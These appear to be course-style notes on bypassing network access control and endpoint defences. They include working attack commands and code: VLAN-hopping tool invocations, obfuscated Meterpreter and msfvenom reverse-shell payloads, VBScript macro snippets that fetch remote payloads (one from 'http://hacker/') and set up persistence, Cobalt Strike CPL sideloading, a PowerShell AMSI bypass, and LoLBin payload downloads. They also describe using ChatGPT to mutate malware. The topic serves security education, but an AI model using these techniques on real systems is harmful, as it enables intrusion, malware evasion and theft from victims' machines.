## 1. Bypassing NAC using VLAN Hopping

Network Access Control (NAC) blocks unauthorized or unknown devices. Attackers bypass NAC using VLAN hopping via **Dynamic Trunking Protocol (DTP)**.
* Attackers send DTP packets setting the switch mode to `"dynamic auto"` or `"dynamic desirable"`. This creates a trunk allowing access to all VLANs.

### VLAN Hopping Tools (Source: [https://github.com](https://github.com)):
* **VLANPWN:** A simple Python script for VLAN enumeration and hopping.
* **DoubleTagging.py:** Executes a VLAN-hopping attack by injecting a frame with two `802.1Q` tags.
  * *Command:* `python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim <IP> --attacker <IP>`
* **DTPHijacking.py:** Conducts DTP-switch spoofing/hijacking attacks to convert the attacker's machine into a trunk channel.
  * *Command:* `python3 DTPHijacking.py --interface eth0`

## 2. Bypassing NAC using Pre-authenticated Device

Attackers place a rogue device (e.g., Raspberry Pi with two network adapters) directly *between* the network switch and an already authenticated device. They can then smuggle network packages using the authenticated device's credentials.

### Tools for Pre-authenticated Device Evasion:
* **nac_bypass_setup.sh** ([https://github.com](https://github.com))
* **FENRIR** ([https://github.com](https://github.com))

## 3. Bypassing Endpoint Security using Ghostwriting

**Ghostwriting** involves modifying the structure of the malware assembly code without affecting its functionality to evade signature-based antivirus detection.
* Achieved by deconstructing binary assembly code, inserting arbitrary "junk" code, and reconstructing it.
* **Tool:** `Ghostwriting.sh` (Source: [https://github.com](https://github.com)) uses Metasploit tools to automate the process.

**Execution Example:**
```bash
cd /opt/ghostwriting/
sudo ./ghostwriting.sh
```
*The script creates a MeterPreter reverse TCP binary, disassembles it, inserts junk code, reassembles it, and opens a web server on the attacker's IP (`Serving HTTP on 0.0.0.0 port 8000`) for the victim to download the undetected payload.*

## 4. Bypassing using Application Whitelisting

Attackers perform **DLL Hijacking** by placing a malicious DLL with a legitimate name in the same directory as a whitelisted executable. Due to the Windows OS DLL search order, the malicious DLL is loaded, elevating privileges and evading security.

Attackers also abuse legitimate tools to load malicious DLLs:
* `rundll32.exe`, `PowerShell`, and `regsvr32.exe`.
* **Example:** `regsvr32.exe /s /n /u /i:"C:\path_to_malicious.dll"`

## 5. Bypassing by Dechaining Macros

Since Microsoft Office macros are based on VBScript, attackers use VBScript to evade endpoint detection by modifying memory and registries. This **"dechains"** the malicious activity from the macro process.

### Techniques to Dechain Macros:
1. **Spawning through ShellCOM:**
   ```vbscript
   Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
   obj.Document.Application.ShellExecute "calc.exe",Null,"C:\\Windows\\System32",Null,0
   ```
2. **Spawning using XMLDOM:**
   ```vbscript
   Set xml = CreateObject("Microsoft.XMLDOM") 
   xml.async = False 
   Set xsl = xml 
   xsl.load("file://|http://hacker/malicous_payload.xsl") 
   xml.transformNode xsl
   ```
3. **Spawning through WmiPrvse.exe:**
   ```vbscript
   Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
   Set objStartup = objWMIService.Get("Win32_ProcessStartup") 
   Set objConfig = objStartup.SpawnInstance_ 
   Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
   errReturn = objProcess.Create("calc.exe", Null, objConfig, intProcessID)
   ```
4. **Creating Scheduled Tasks:**
   ```vbscript
   Set service = CreateObject("Schedule.Service") 
   Call service.Connect 
   Dim td: Set td = service.NewTask(0) 
   ...
   Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
   ```
5. **Registry Modification:**
   ```vbscript
   Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
   objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "key1", "value1"
   ```
6. **Dropping Files:**
   ```vbscript
   Path = CreateObject("WScript.Shell").SpecialFolders("Startup") 
   Set objFSO = CreateObject("Scripting.FileSystemObject") 
   Set objFile = objFSO.CreateTextFile(Path & "\sample.bat", True) 
   objFile.Write "notepad.exe" & vbCrLf 
   objFile.Close
   ```
7. **Downloading Content (XMLHTTP & ADODB):**
   ```vbscript
   Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
   Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
   xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", False
   xHttp.Send
   With bStrm 
       .Type = 1 .Open 
       .write xHttp.responseBody 
       .savetofile Environ("APPDATA") & "\sample.exe", 2
   End With
   ```
8. **Embed File and Drop (Metasploit `vba-exe`):**
   ```bash
   msfvenom -p generic/custom PAYLOADFILE=/home/user1/Downloads/calc.exe -a x64 --platform windows -f vba-exe
   ```

## 6. Bypassing by Clearing Memory Hooks

EDR agents place "hooks" at a high-level privileged kernel to collect information for behavioral analysis (e.g., intercepting `WriteProcessMemory`).
* Attackers unhook the EDR DLLs by finding the exported syscalls.
* **Tool:** `x64dbg` debugger is used to identify hooked syscalls in memory.
* Attackers then reload the memory segment, erasing the EDR hooks. The EDR's DLL still exists on disk but receives no information from the hooks.

---

## 7. Bypassing by Process Injection

Injecting malware code into the memory of legitimate running processes. This is performed through Windows API functions:
1. **VirtualAllocEx():** Allocates memory within the address space of a target process.
2. **WriteProcessMemory():** Writes malicious code into the allocated memory space.
3. **CreateRemoteThread():** Creates a remote thread within the target process to execute the injected code.

## 8. Bypassing the EDR using LoLBins

**Living off the Land Binaries (LoLBins)** are legitimate tools preinstalled on the OS (e.g., PowerShell). By using them, activities appear normal.
* **Step 1: Payload Generation.** Configure an agent in **Deimos C2** (Golang framework) over HTTPS and upload it to an external server.
* **Step 2: Agent Download.** Execute a Windows Binary:
  `C:\> ConfigSecurityPolicy.exe <http://example.com/payload>`
* **Step 3: Agent Execution.** Use `CustomShellHost.exe` to execute the downloaded payload, replacing Explorer.exe.

## 9. Bypassing by CPL (Control Panel) Side-Loading

`.cpl` files are used for Windows Control Panel applets. Attackers exploit how Windows handles CPL files by sideloading them, mimicking legitimate applets.
* Attackers rename harmful `.dll` files to `.cpl` and register them in the registry to run via `DllEntryPoint`.

**Using CPLResourceRunner (Source: [https://github.com](https://github.com)):**
1. Generate an x86 payload in Cobalt Strike (`beacon.bin`).
2. Run `ConvertShellcode.py` on `beacon.bin` to create `shellcode.txt`.
3. Base64 encode the shellcode:
   ```bash
   cat shellcode.txt |sed 's/[, ]//g; s/0x//g;' |tr -d '\n' |xxd -p -r |gzip -c |base64 > b64shellcode.txt
   ```
4. Copy `b64shellcode.txt` to `Resources.txt`.
5. Compile resources into `CPLResourceRunner.dll` and rename it to `maliciousnew.cpl`.

## 10. Bypassing using ChatGPT

Attackers use **ChatGPT** to mutate malicious code and create polymorphic malware that evades conventional endpoint security.
* **Generating Mutated Code:** Asking ChatGPT to "Turn this mutated code into base64".
* **Generating Dynamic Code:** Asking ChatGPT for a Python script to search for specific file extensions (e.g., `.pdf`, `.docx`) or generate an encryption utility (e.g., using `cryptography.fernet`).
* **Bypassing AMSI:** Malware can use a Python interpreter to query ChatGPT on the fly, receiving instructions as text to execute. This stealthy execution bypasses the Antimalware Scan Interface (AMSI).

## 11. Bypassing using Metasploit Templates

Attackers modify Metasploit templates to decrease the detection rate of payloads.
1. Generate standard payload:
   `msfvenom -p windows/shell_reverse_tcp lhost=<Target IP> lport=444 -f exe > Windows.exe`
2. Decrease payload size in `template.c` (from `4096` to `4000`):
   ```c
   #include <stdio.h> 
   #define SCSIZE 4000 
   char payload[SCSIZE] = "PAYLOAD:"; 
   char comment[512] = ""; 
   int main(int argc, char **argv) { 
       (*(void (*) () ) payload) (); 
       return(0);
   }
   ```
3. Recompile template:
   `i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe`
4. Generate payload using the new template:
   `msfvenom -p windows/shell_reverse_tcp lhost=<Target IP> lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > bypass.exe`

## 12. Bypassing Windows Antimalware Scan Interface (AMSI)

**AMSI** is a Windows API that enhances malware protection.
1. **PowerShell Downgrade:** Run `powershell -version 2` to execute malicious commands like `amsiutils` (which are blocked in newer versions).
2. **Obfuscation:** Break strings and concatenate using `+` (e.g., `Invoke-Mimikatz` becomes `"Inv"+"o"+"ke"+"-Mimi"+"katz"`). Tools like **AmsiTrigger** can scan scripts to identify lines for targeted obfuscation.
3. **Forcing an Error:** Set `amsiInitFailed()` to Boolean True.
   ```powershell
   $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
   [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem);
   ```
4. **Memory Hijacking:** Hook `AmsiScanBuffer()` to always return `AMSI_RESULT_CLEAN`.
   ```powershell
   [System.Reflection.Assembly]::LoadFile("<Path to ASBBypass.dll file>") 
   [Amsi]::Bypass()
   ```

## 13. Other Techniques for Bypassing Endpoint Security

* **Hosting Phishing Sites on Popular Infrastructure:** Using Google Cloud and AWS (which are rarely blacklisted) to host phishing websites.
* **Passing Encoded Commands:** Base64 encoding malicious PowerShell commands.
  * `$encodedCommand = [Convert]::ToBase64String($bytes)`
* **Fast Flux DNS:** Rapidly changing IP addresses and DNS names (used by large botnets) to hide C&C servers behind reverse proxies.
* **Timing-based Evasion:** Delaying execution (sleep patching, time bombs) to outlast the local AV Sandbox.
* **Signed Binary Proxy Execution:** Leveraging trusted in-built utilities (e.g., `rundll32`) signed with digital certificates to proxy malicious code execution.
* **Shellcode Encryption:** Encrypting payloads via XOR, RC4, or AES.
* **Reducing Entropy:** Modifying binary characteristics (adding low-entropy images or strings like `chrome.dll` from system files) to appear less suspicious.
* **Disabling Event Tracing for Windows (ETW):** Patching the `EtwEventWrite` function in `ntdll.dll` to return zero (SUCCESS), blinding EDR telemetry.
* **Direct System Calls:** Calling kernel-equivalent `NtAllocateVirtualMemory` directly to evade hooks.
* **Spoofing Thread Call Stack:** Intercepting the `Sleep()` function. The implant overwrites the return address with `0x0`, calls original `Sleep()`, then restores the original address upon returning, avoiding memory scanners.
* **In-memory Encryption of Beacon:** Encrypting the shellcode with XOR during the `Sleep()` state and decrypting it upon resuming.
